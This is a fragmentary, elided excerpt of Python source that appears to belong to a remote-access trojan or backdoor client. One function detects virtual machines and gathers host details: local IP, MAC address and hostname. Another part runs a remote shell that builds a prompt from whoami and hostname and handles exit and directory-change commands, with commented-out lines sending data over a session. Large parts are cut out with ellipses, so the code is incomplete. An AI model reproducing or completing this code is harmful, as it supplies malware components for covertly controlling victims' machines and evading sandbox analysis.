...
def survey():
    ...
    for n in vms:
        if n.lower() in output.decode("utf-8").lower():
            vm = "This is a {} Virtual Machine.".format(n)
    ...
    """.format(vm, lip, macaddr, hostname)
    print("Local Info: "+everything)
...
#            session.send(Upload(after[9:]).encode("utf-8"))
            ...
            print("Shell Entered!")
            retval = ("
[36m"+str(run_command("whoami")).replace(
"\n", "")+"[0m@[34m"+str(run_command("hostname")).replace(
"\n", "")+"[0m: [33m"+os.getcwd()+"
[36m$[0m ")
        ...
        if after == "exit":
            bash = False
#            session.send(("[36mi[0m Terminated Bash"))
        elif "cd" in after:
            di = after[3:]
            print("Changing to: 
"+di)
